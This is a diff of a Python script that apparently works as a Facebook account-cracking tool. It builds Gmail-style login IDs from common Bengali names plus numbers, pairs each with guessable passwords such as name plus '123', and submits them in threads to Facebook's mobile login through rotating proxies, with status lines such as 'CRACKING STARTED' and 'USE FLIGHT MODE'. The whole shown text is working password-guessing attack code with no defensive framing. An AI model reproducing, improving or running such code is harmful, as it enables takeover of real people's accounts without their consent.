@@ -935,11 +935,11 @@ def g_clone():
     os.system('clear')
     print(logo)
     print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    first = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    last = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    first = random.choice(['sumon','abinash','rakesh','riya','ramesh','somnath'])
+    last = random.choice(['roy','das','sarkar','mondal'])
     domain = '@gmail.com'
     try:
-        limit = int(input(' [â¢] Crack Limit : '))
+        limit = int(input(' [:] Crack Limit : '))
     except ValueError:
         limit = 5000
     for nmbr in range(limit):
@@ -968,13 +968,13 @@ def g_clone():
         tl = str(len(user))
         os.system("clear")
         print(logo)
-        print(' [â¢] CRACKING STARTED ')
-        print(' [â¢] TOTAL ACCOUNT : \033[1;32m'+tl)
-        print(' [!] USE FLIGHT MODE FOR MORE IDZ ')
+        print(f'{green}=> BE PATIENT BABY ')
+        print(f'{green}=> TOTAL LIMID : \033[1;32m'+tl)
+        print(f'{green}=> USE FLIGHT MODE ')
         print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
         for love in user:
-            uid = first+'.'+last+'.'+love+domain
-            pwx = [first+last,first+' '+last,first+last+'12',last,first+love,first+'123',first+'1234',first+last+'12']
+            uid = first+last+love+domain
+            pwx = [first+last,first+'12',first+'123',first+'1234',first+'12345']
             if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
             elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
             elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
@@ -1251,6 +1251,7 @@ def mbasic(uid,pwx,tl):
             nip=random.choice(xvx)
             proxs= {'http': nip}
             print(uid)
+            print(pw)
             Session = requests.Session()
             free_fb = Session.get('https://m.facebook.com/').text
             data ={
